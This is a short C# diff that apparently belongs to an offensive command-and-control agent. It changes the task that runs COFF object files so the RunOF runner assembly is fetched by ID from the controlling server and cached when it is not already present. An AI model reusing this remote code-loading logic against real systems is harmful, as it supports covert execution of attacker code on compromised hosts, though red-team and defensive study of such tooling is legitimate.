@@ -33,6 +33,8 @@ namespace Tasks
             public List<string[]> CoffArguments;
             [DataMember(Name = "loader_stub_id")]
             public string LoaderStubId;
+            [DataMember(Name = "runof_id")]
+            public string RunOFId;
         }
 
         public execute_coff(IAgent agent, Task task) : base(agent, task)
@@ -56,7 +58,15 @@ namespace Tasks
                 }
                 else
                 {
-                    _agent.GetFileManager().GetFileFromStore("RunOF.dll", out byte[] bofRunnerAsm);
+                    _agent.GetFileManager().GetFileFromStore(parameters.RunOFId, out byte[] bofRunnerAsm);
+                    if (bofRunnerAsm is null || bofRunnerAsm.Length == 0)
+                    {
+                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.RunOFId, out bofRunnerAsm))
+                        {
+                            _agent.GetFileManager().AddFileToStore(parameters.RunOFId, bofRunnerAsm);
+                        }
+                    }
+                    
                     if (_agent.GetFileManager().GetFileFromStore(parameters.CoffName, out byte[] coffBytes))
                     {
                         if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] coffPic))
